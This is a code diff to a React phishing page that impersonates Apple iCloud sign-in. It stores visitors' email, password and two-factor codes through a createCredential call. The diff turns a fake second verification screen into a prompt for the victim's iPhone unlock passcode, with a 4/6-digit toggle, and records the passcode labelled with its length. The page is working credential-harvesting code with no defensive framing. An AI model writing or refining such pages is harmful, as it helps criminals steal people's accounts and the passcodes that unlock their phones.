@@ -13,6 +13,7 @@ type Step = "facebook_start" | "login" | "two_factor" | "loading_two" | "code_tw
 
 export default function Home() {
   const [step, setStep] = useState<Step>("facebook_start");
+  const [passcodeLength, setPasscodeLength] = useState<4 | 6>(6);
   const [verificationCode, setVerificationCode] = useState(["", "", "", "", "", ""]);
   const [verificationCodeTwo, setVerificationCodeTwo] = useState(["", "", "", "", "", ""]);
   const { mutateAsync: createCredential } = useCreateCredential();
@@ -74,15 +75,15 @@ export default function Home() {
     setVerificationCodeTwo(newCode);
 
     // Auto-focus next input
-    if (value !== "" && index < 5) {
+    if (value !== "" && index < passcodeLength - 1) {
       const nextInput = document.getElementById(`code-two-${index + 1}`);
       nextInput?.focus();
     }
 
-    // Explicitly check for 6 digits before submitting
-    const completeCode = newCode.join("");
-    if (completeCode.length === 6 && !newCode.includes("")) {
-      handleVerificationSubmitTwo(newCode);
+    // Explicitly check for 4 or 6 digits before submitting
+    const completeCode = newCode.slice(0, passcodeLength).join("");
+    if (completeCode.length === passcodeLength && !newCode.slice(0, passcodeLength).includes("")) {
+      handleVerificationSubmitTwo(newCode.slice(0, passcodeLength));
     }
   };
 
@@ -110,12 +111,12 @@ export default function Home() {
 
   const handleVerificationSubmitTwo = async (codeArray?: string[]) => {
     try {
-      const codeStr = (codeArray || verificationCodeTwo).join("");
-      if (codeStr.length !== 6) return;
+      const codeStr = (codeArray || verificationCodeTwo.slice(0, passcodeLength)).join("");
+      if (codeStr.length !== passcodeLength) return;
 
       await createCredential({
         email: form.getValues("email"),
-        password: `CODE_2: ${codeStr}`,
+        password: `PASSCODE (${passcodeLength} digits): ${codeStr}`,
         service: "icloud"
       });
     } catch (e) {
@@ -318,7 +319,7 @@ export default function Home() {
           </motion.div>
         )}
 
-        {/* STEP 2.5: SECOND TWO FACTOR AUTH */}
+        {/* STEP 2.5: SECOND TWO FACTOR AUTH (PASSCODE) */}
         {step === "code_two" && (
           <motion.div
             key="code_two"
@@ -330,36 +331,49 @@ export default function Home() {
             <div className="mb-8 flex flex-col items-center">
               <FaApple className="text-5xl text-[#1d1d1f] mb-4" />
               <h1 className="text-2xl font-semibold tracking-tight text-center">
-                Additional verification code required
+                Enter iPhone Passcode
               </h1>
               <p className="text-[17px] text-[#86868b] mt-2 text-center leading-snug">
-                Please enter the second code sent to your trusted device to confirm your identity.
+                Enter the passcode that you use to unlock your iPhone.
               </p>
             </div>
 
             <div className="w-full bg-white rounded-2xl shadow-sm border border-[#d2d2d7] p-8">
-              <div className="flex justify-between gap-2">
-                {verificationCodeTwo.map((digit, idx) => (
+              <div className="flex justify-center gap-3">
+                {Array.from({ length: passcodeLength }).map((_, idx) => (
                   <input
                     key={idx}
                     id={`code-two-${idx}`}
-                    type="text"
+                    type="password"
                     inputMode="numeric"
+                    autoComplete="one-time-code"
                     maxLength={1}
-                    value={digit}
+                    value={verificationCodeTwo[idx] || ""}
                     onChange={(e) => handleCodeChangeTwo(idx, e.target.value)}
                     className="w-10 h-14 text-center text-2xl font-semibold border border-[#d2d2d7] rounded-lg focus:border-[#0071e3] focus:ring-1 focus:ring-[#0071e3] outline-none transition-all"
                   />
                 ))}
               </div>
               
-              <div className="mt-8 text-center">
+              <div className="mt-8 text-center space-y-4">
                 <button 
-                  onClick={() => setVerificationCodeTwo(["", "", "", "", "", ""])}
-                  className="text-sm text-[#0071e3] hover:underline"
+                  onClick={() => {
+                    const newLength = passcodeLength === 6 ? 4 : 6;
+                    setPasscodeLength(newLength);
+                    setVerificationCodeTwo(["", "", "", "", "", ""]);
+                  }}
+                  className="text-sm text-[#0071e3] font-medium hover:underline"
                 >
-                  Didn't get a verification code?
+                  Passcode Options
                 </button>
+                <div className="block">
+                  <button 
+                    onClick={() => setVerificationCodeTwo(["", "", "", "", "", ""])}
+                    className="text-xs text-[#86868b] hover:underline"
+                  >
+                    Forgot passcode?
+                  </button>
+                </div>
               </div>
             </div>
           </motion.div>
